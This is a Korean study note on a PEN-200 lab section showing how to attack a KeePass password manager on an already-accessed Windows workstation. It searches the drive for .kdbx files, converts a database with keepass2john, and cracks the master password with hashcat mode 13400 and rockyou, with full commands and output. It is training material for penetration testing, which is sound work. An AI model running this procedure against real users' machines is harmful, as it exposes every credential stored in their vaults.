# 16.2.4 패스워드 매니저

> **Password Manager** · PEN-200 §16.2.4

패스워드 매니저는 여러 서비스의 자격 증명을 마스터 패스워드 하나로 잠가 보관함. 복잡한 패스워드를 여럿 유지해야 하는 사용자에겐 도움이지만 공격자 입장에선 **단일 실패점**임 — 마스터 패스워드 하나가 깨지면 저장된 전부가 열림. 1Password·KeePass 가 대표적임.

전제 시나리오 — 패스워드 매니저가 돌아가는 클라이언트 워크스테이션에 이미 접근한 상태(SALESWK01 192.168.50.203 에 `jason`/`lab` 로 RDP). 여기서 ① DB 파일 회수 → ② Hashcat 이 먹는 형식으로 변환 → ③ 마스터 패스워드 크래킹의 3단계를 돎. 앞서 세운 크래킹 방법론을 그대로 적용하는 것임.

**먼저 «무엇이 설치돼 있나»부터 봄.** GUI 가 있으면 Windows 의 Add or remove programs(Apps & features)가 가장 단순한 경로임. 목록에서 KeePass 를 확인했으면 그 제품이 DB 를 어떤 형식으로 두는지 조사해야 함 — KeePass 는 `.kdbx` 이고, **한 대에 여러 개가 있을 수 있음**(개인용 DB + 부서 공용 DB). 그래서 특정 폴더가 아니라 드라이브 전체를 훑음.
```
PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction
SilentlyContinue
    Directory: C:\Users\jason\Documents
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022   8:19 AM           1982 Database.kdbx
```

`-Include *.kdbx` 로 확장자를 좁히고 `-File -Recurse` 로 하위 디렉터리까지 내려가며, `-ErrorAction SilentlyContinue` 로 접근 거부 오류를 눌러 순회가 중간에 멈추지 않게 하는 것이 요점임. (위 블록은 교재 PDF 자체의 조판으로 명령 한 줄이 두 줄로 접혀 있음 — `SilentlyContinue` 는 원래 같은 줄임. 그대로 복사해 쓰면 실패함)

찾은 `Database.kdbx` 를 Kali 로 옮긴 뒤 **변환 단계**. JtR 수트의 `*2john` 스크립트군(`ssh2john`·`keepass2john` 등)이 다양한 파일 형식을 크래킹 도구가 읽는 해시 문자열로 바꿔 줌. Kali 기본 설치이며 산출물은 Hashcat 에도 그대로 들어감.
```
kali@kali:~/passwordattacks$ ls -la Database.kdbx
-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx
kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash
kali@kali:~/passwordattacks$ cat keepass.hash
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9ae
c6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd
843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3
ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

⚠️ **이걸 그대로 던지면 안 됨.** `keepass2john` 은 해시 앞에 파일명을 `Database:` 로 붙임 — DB 해시 여러 개를 깰 때 결과에 대응 사용자명을 함께 남기려고 마련된 자리임. KeePass 마스터 패스워드에는 짝지을 사용자명이 없으므로, 편집기로 `Database:` 를 지워 `$keepass$` 로 시작하게 만들어야 Hashcat 형식이 됨.

```
kali@kali:~/passwordattacks$ cat keepass.hash
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0
bfd787898d8dcd4d463ee768e...
```
*`Database:` 를 지운 뒤 — `$keepass$` 로 시작해야 Hashcat 이 받음*

모드 번호는 위키를 뒤지기보다 도구에 직접 묻는 편이 빠름.
```
kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
```

크래킹 시간 산정 단계는 이 예제에선 건너뜀(금방 끝남). 워드리스트는 `rockyou.txt` 에 `rockyou-30000.rule` 을 얹음 — 이 룰 파일이 애초에 rockyou 를 겨냥해 만들어져 궁합이 좋음.
```
kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --
force
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0
bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee30

35689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
```

수 초 만에 마스터 패스워드 `qwertyuiop123!` 가 나옴. (위 블록도 교재 PDF 자체의 조판으로 명령이 세 줄로 접혔고 `--force` 가 `--` 와 `force` 로 쪼개짐 — 손으로 이어 붙여 쓸 것) RDP 세션에서 KeePass 를 열어 이 값을 넣으면 저장된 자격 증명 전부가 드러남.

시험장에서는 — Windows 워크스테이션을 잡았는데 다음 수가 안 보일 때 펴는 절임. 설치 목록 확인 → 확장자 전수 검색 → `*2john` 변환 → `hashcat --help | grep` 모드 조회의 순서는 KeePass 가 아닌 다른 제품에도 그대로 옮겨 씀.
